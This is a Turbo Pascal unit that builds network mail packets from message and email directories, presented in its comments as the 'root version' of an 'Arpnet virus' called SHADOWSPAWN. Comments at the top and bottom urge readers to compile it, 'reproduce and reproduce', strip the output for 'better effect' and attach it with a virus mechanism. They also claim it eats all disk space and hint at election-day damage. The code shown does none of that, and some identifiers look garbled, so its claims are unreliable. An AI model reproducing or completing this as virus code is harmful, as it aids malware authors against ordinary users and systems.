{modified version of Arpnet virus:Pascal should be redif to ASM}
{obj are ok compile will attach with viru@2 mechanizism..per @Trash33}
{makes the disk space packets and eats all avalible space,loop it  }
{Enjoy and modify this is root version...aka SHADOWSPAWN}
Unit  Netsnd;
Interface
Uses  Crt, Dos, Consts, Types, Iostuff, Routing,
      Netvars, Netfncs, Netrcv, Btree, Filedecs;
PROCEDURE make_packets;
Implementation
{--------MAKE PACKETS AND PACKETS AND PACKETS--------------------------------}
PROCEDURE make_packets;
VAR   msg_counter : INTEGER;
      tmp_ptr     : node_info_ptr;
      month,day,year,dow : WORD;
      hour,minute,second,hund : WORD;
      temp        : line;
      rl          : LONGINT;
      x           : INTEGER;
      new_net     : INTEGER;
      new_node    : INTEGER;
      attr        : INTEGER;
      fwd         : BOOLEAN;
      ch          : CHAR;
      t1,t2,t3    : INTEGER;
      i,j         : INTEGER;
      seen        : BOOLEAN;
      more        : BOOLEAN;
      lrnum       : lrnumber;
      lrtmp       : LONGINT;
      tmp         : short_string;
   {-------------------SET UP FOR NET NODE PACKETS---------------------------}
   PROCEDURE construct_packet(new_net, new_node: INTEGER);
   VAR   first_pk : INTEGER;
   BEGIN
      INC(msg_counter);
      tmp_ptr := node_c;
      first_pk := -1;
      WHILE (tmp_ptr <> NIL) AND
         NOT ((tmp_ptr^.net = new_net) AND
         (tmp_ptr^.node = new_node)) DO BEGIN
         tmp_ptr := tmp_ptr^.ptr
      END;
      IF tmp_ptr = NIL THEN
         BEGIN
            NEW(tmp_ptr);
            FILLCHAR(tmp_ptr^,SIZEOF(node_info),0);
            tmp_ptr^.ptr := node_c;
            node_c := tmp_ptr;
            node_c^.net := new_net;
            node_c^.node := new_node;
            node_c^.tries := 0;
            node_c^.connects := 0;
            node_c^.success := FALSE;
            ASSIGN(pk_index,default.database_drive + pkindexfile);
            {$I-} RESET(pk_index); {$I+}
            IF IOresult = 0 THEN
               BEGIN
                  x := 0;
                  pk_idx.net := 0;
                  pk_idx.node := 0;
                  WHILE NOT EOF(pk_index) AND
                     NOT ((pk_idx.net = new_net) AND (pk_idx.node = new_node)) DO BEGIN
                     READ(pk_index,pk_idx);
                     IF pk_idx.avail AND (first_pk < 0) THEN
                        first_pk := x;
                     INC(x)
                  END;
                  IF (pk_idx.net = new_net) AND (pk_idx.node = new_node) THEN
                     BEGIN
                        node_c^.pk_num := x - 1;
                        first_pk := -1
                     END
                  ELSE
                     BEGIN
                        IF first_pk < 0 THEN
                           first_pk := FILESIZE(pk_index);
                        node_c^.pk_num := first_pk;
                        pk_idx.avail := FALSE;
                        pk_idx.sent := FALSE;
                        pk_idx.attempts := 0;
                        pk_idx.net := new_net;
                        pk_idx.node := new_node;
                        SEEK(pk_index,first_pk);
                        WRITE(pk_index,pk_idx)
                     END
               END
            ELSE
               BEGIN
                  REWRITE(pk_index);
                  first_pk := 0;
                  node_c^.pk_num := 0;
                  pk_idx.avail := FALSE;
                  pk_idx.sent := FALSE;
                  pk_idx.attempts := 0;
                  pk_idx.net := new_net;
                  pk_idx.node := new_node;
                  SEEK(pk_index,first_pk);
                  WRITE(pk_index,pk_idx)
               END;
            CLOSE(pk_index);
            ASSIGN(p_info,default.database_drive + 'PK' + dual(node_c^.pk_num) + '.XMT');
            {$I-} RESET(p_info); {$I+}
            IF (IOresult = 0) AND (first_pk >=0) THEN
               CLOSE(p_info)
            ELSE
               BEGIN
                  REWRITE(p_info);
                  GETDATE(year,month,day,dow);
                  GETTIME(hour,minute,second,hund);
                  packet.year := year;
                  packet.month := month;
                  packet.day := day;
                  packet.hour := hour;
                  packet.minute := minute;
                  packet.second := second;
                  WITH packet DO BEGIN
                     orig_net := default.net;
                     dest_net := new_net;
                     orig_node := default.node;
                     dest_node := new_node;
                     baud_rate := 1200;
                     pk_ver := packet_version;
                     prod_code := product_code;
                     FILLCHAR(fill,SIZEOF(fill),0)
                  END;
                  WRITE(p_info,packet);
                  CLOSE(p_info)
               END
         END;
{ The following code will construct the actual message that is to be
  transmitted. I'm sure some intelligent soul out there can figure out
  that this section of code can be replaced to transmit anything as the
  packet is a protocol level above the information actually being transmitted
  to the destination node... }
      ASSIGN(packets,default.database_drive + 'PK' + dual(tmp_ptr^.pk_num) + '.XMT');
      RESET(packets);
      SEEK(packets,FILESIZE(packets));
      temp := convert(mesg.org_time.date,rl);
      temp := day_of_week[rl MOD 7] + ' '
            + dual(value(COPY(mesg.org_time.date,4,2))) + ' '
            + month_of_year[value(COPY(mesg.org_time.date,1,2))] + ' '
            + dual(value(COPY(mesg.org_time.date,7,2))) + ' '
            + dual(value(COPY(mesg.org_time.time,1,2))) + ':'
            + dual(value(COPY(mesg.org_time.time,4,2))) + NULL;
      write_int($0002);                     {Packet header}
      write_int(mesg.orig_node);            {Originating node}
      write_int(mesg.dest_node);            {Destination node}
      write_int(mesg.orig_net);             {Originating net}
      write_int(mesg.dest_net);             {Destination net}
      attr := mesg.flags AND $7413;         {Zero required attributes}
      write_int(attr);                      {File attribute}
{?}   write_int($0000);                     {File transmission cost}
      write_line(temp);                     {Date/Time group}
      write_line(mesg.dest_user + NULL);    {Who message is to}
      write_line(mesg.org_user + NULL);     {Who it is from};
      write_line(mesg.title + NULL);        {Subject of message};
      x := 0;
      WHILE (mesg_text[x + 1] <> '') AND (x < max_msg_entry) DO BEGIN
         INC(x);
         write_line(mesg_text[x] + CR);
         IF POS('Message ID: ',mesg_text[x]) > 0 THEN
            BEGIN
               temp := COPY(mesg_text[x],POS('Message ID: ',mesg_text[x]) + 12,9);
               tmp := convert(system_date,lrtmp);
               lrnum := lrtmp;
               insertvalueinbtree(pkfile,lrnum,temp)
            END
      END;
      write_line(mesg_text[x + 1] + NULL);
      write_int($0000);                    {End of packet}
      CLOSE(packets)
   END;
   {---THIS IS JUST FOR FUN    BETTER TO LEAVE OUT UNLESS YOU WANT TO TRAIL--}
BEGIN
   openwindow(40,5,76,15,'Mail packet construction',YELLOW,back,4);
   setcolor(fore,back);
   writest('Constructing transmission packets',2,2);
   WRITELN(log_file,'Making the mail packets...',system_date,' ',system_time);
   node_c := NIL;
   msg_counter := 0;
   ASSIGN(mesg_dir,default.msg_drive + msg_file_dir);
   {$I-} RESET(mesg_dir); {$I+}
   IF IOresult <> 0 THEN
      BEGIN
         WRITELN(log_file,'I can''t open the message directory!');
         writest('ERROR: Cannot open the message directory',2,4);
         EXIT
      END;
   t1 := 9;                    { Note: This is the networking base }
   REPEAT
      SEEK(mesg_dir,t1);
      READ(mesg_dir,mesg);
      t1 := mesg.dir_link;
      t2 := mesg.sub_dir_link;
      WHILE t2 > 0 DO BEGIN
         SEEK(mesg_dir,t2);
         READ(mesg_dir,mesg);
         t2 := mesg.dir_link;
         t3 := mesg.sub_dir_link;
         IF t3 > 0 THEN
            BEGIN
               SEEK(mesg_dir,t3);
               READ(mesg_dir,mesg);
               t3 := mesg.sub_dir_link;
               SEEK(mesg_dir,t3);
               READ(mesg_dir,mesg);
               REPEAT
                  IF (mesg.dir_type = message) AND
                     test_bit(msg_bit + (t3 DIV 1024),t3 MOD 1024) AND
                     bit(mesg.flags,8) OR bit(mesg.flags,5) THEN
                     BEGIN
                        read_for_edit(default.msg_drive + msg_msg_dir,mesg.msg_link,mesg_text);
                        more := FALSE;
                        new_net := 0;
                        new_node := 0;
                        REPEAT
                           fwd := FALSE;
                           get_route_info(mesg.dest_net,mesg.dest_node,
                                          new_net,new_node,fwd,more);
                           get_node_info(new_net,new_node,destnode);
                           i := 1;
                           seen := FALSE;
                           REPEAT
                              IF POS('Message ID:',mesg_text[i]) > 0 THEN
                                 seen := TRUE;
                              IF (POS(' ' + destnode.serial_num,mesg_text[i]) > 0)
                                 AND seen THEN
                                 i := 0
                              ELSE
                                 INC(i)
                           UNTIL (i = 0) OR (POS(#$FF,mesg_text[i]) > 0);
                           IF (i <> 0) AND ((NOT bit(mesg.flags,5) AND fwd) AND
                              bit(mesg.flags,8)) AND
                              NOT ((new_net = 0) AND (new_node = 0)) THEN
                              BEGIN
                                 writest('Packet to Net/Node: ',2,4);
                                 WRITE(new_net,'/',new_node,' ',destnode.serial_num,'   ');
                                 writest('Title: ' + mesg.title,2,5);
                                 CLREOL;
                                 construct_packet(new_net,new_node)
                              END
                        UNTIL NOT more;
                        mesg.flags := mesg.flags OR $0020;
                        SEEK(mesg_dir,t3);
                        WRITE(mesg_dir,mesg)
                     END;
                  t3 := mesg.sub_dir_link;
                  SEEK(mesg_dir,t3);
                  READ(mesg_dir,mesg)
               UNTIL mesg.dir_link < 0
            END
      END;
   UNTIL t1 <= 0;
   GOTOXY(2,4);
   CLREOL;
   CLOSE(mesg_dir);
   ASSIGN(email_dir,default.email_drive + email_file_dir);
   {$I-} RESET(email_dir); {$I+}
   IF IOresult <> 0 THEN
      BEGIN
         WRITELN(log_file,'I can''t open the email directory!');
         writest('I can''t open the email directory!',2,4);
         EXIT
      END;
{-------------CAUGHT SO WHAT DO YOU DO...DOESN'T MATTER DOES IT?--------}
   WHILE NOT EOF(email_dir) DO BEGIN
      READ(email_dir,email);
      IF test_bit(email_bit,FILEPOS(email_dir) - 1) AND
         bit(email.attrib,0) AND NOT bit(email.attrib,5) THEN
         BEGIN
            more := FALSE;
            fwd := TRUE;
            get_route_info(email.dest_net,email.dest_node,new_net,new_node,fwd,more);
            get_node_info(new_net,new_node,destnode);
            IF (new_net <> 0) OR (new_node <> 0) THEN
               BEGIN
                  read_for_edit(default.email_drive + email_msg_dir,
                                email.msg_link,mesg_text);
                  writest('Packet to Net/Node: ',2,4);
                  WRITE(new_net,'/',new_node,' ',destnode.serial_num,'   ');
                  writest('Name:  ' + email.dest_name,2,5);
                  CLREOL;
                  mesg.orig_node := email.org_node;
                  mesg.orig_net := email.org_net;
                  mesg.dest_node := email.dest_node;
                  mesg.dest_net := email.dest_net;
                  mesg.flags := email.attrir;
                  mesg.dest_user := email.dest_name;
                  mesg.org_user := email.org_name;
                  mesg.title := '|/\|';
                  construct_packet(new_net,new_node)
               END;
            email.attrir := email.attrib OR $0020;
            SEEK(email_dir,FILEPOS(email_dir) - 1);
            WRITE(email_dir,email)
         END
   END;
   CLOSE(email_dir);
   WRITELN;
   CLREOL;
{---------PUNISHMENT I WANT TO KNOW WHERE IT GOES BETTER LEFT OUT------}
   writest('Packets constructed: ' + strval(msg_counter),7,7);
   IF paramstr(1) = '' THEN
      BEGIN
         writest('Press any key to continue',6,8);
         hidecursor;
         ch := readkey;
         IF ch = #0 THEN
            ch := readkey;
         showcursor
      END;
   closewindow(4);
   WRITELN(log_file,'Done making the packets. Constructed: ',msg_counter)
END;
{---RIGHT LOOKS GOOD AND USEFULL  COMPILE AND REPRODUCE AND REPRODUCE----}
END.
{Above code: Is a GMPFU@C, Gone Made from UnderGrad @ College -Program 87}
{->Arpnet Virus:attachments must be modified,take out the write statements for}
{better effect and code speed, this is the root of the virus without any }
{destructive tendencies......hehehe}
{ShadowSpawn cc @wiskiesour@.988, ACTUALLY MY NAME THIS WEEK IS GEORGE BUSH}
{--------------------------------------------------------------------------}
{It gets better, wait till election Day!!!!!!!...better close your.........}
